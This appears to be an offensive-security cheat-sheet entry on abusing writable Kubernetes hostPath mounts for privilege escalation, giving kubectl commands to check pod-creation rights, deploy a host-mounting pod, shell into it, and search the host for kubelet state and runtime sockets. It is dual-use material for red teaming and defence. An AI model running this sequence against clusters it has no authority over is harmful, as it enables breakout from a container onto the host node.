---
technique: Kubernetes hostPath Mount Abuse
category: privilege-escalation
targets: Kubernetes Pods, Host Filesystem
protocols: Kubernetes API
remote_capable: true
tags: kubernetes hostpath host-mount privilege-escalation
---

# Kubernetes hostPath Mount Abuse

Writable `hostPath` mounts can expose host files, kubelet state, runtime sockets, pod volumes, and neighboring workload data.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Pod creation | Requires rights to create or patch pods |
| Admission | Pod Security or webhooks may block hostPath usage |
| Node access | Impact depends on the selected node and mounted path |

## Linux

### hostPath pods

#sh #kubectl #hostpath

List pods and inspect mounted host paths.

```sh title:"List pods for hostPath review"
kubectl get pods --all-namespaces -o yaml
```
<!-- cheat -->

### Can create pods

#sh #kubectl #rbac

Check whether the current identity can create pods.

```sh title:"Check pod creation rights"
kubectl auth can-i create pods -n "$namespace"
```
<!-- cheat
var namespace
-->

### Apply hostPath pod

#sh #kubectl #hostpath

Create a prepared pod manifest that mounts a host path.

```sh title:"Apply hostPath pod manifest"
kubectl apply -f "$manifest_file"
```
<!-- cheat
var manifest_file
-->

### Host mount shell

#sh #kubectl #hostpath

Open a shell in the pod with the host path mounted.

```sh title:"Shell into hostPath pod"
kubectl exec -it "$pod_name" -n "$namespace" -- /bin/sh
```
<!-- cheat
var pod_name
var namespace
-->

### Mounted kubelet pods

#sh #kubernetes #hostpath

Inspect kubelet-managed pod state through a mounted host path.

```sh title:"List mounted kubelet pod state"
find /host/var/lib/kubelet/pods -maxdepth 3 -type d
```
<!-- cheat -->

### Mounted runtime sockets

#sh #kubernetes #hostpath

Check for runtime sockets inside a mounted host path.

```sh title:"Find runtime sockets in host mount"
find /host -type s -name "*.sock"
```
<!-- cheat -->
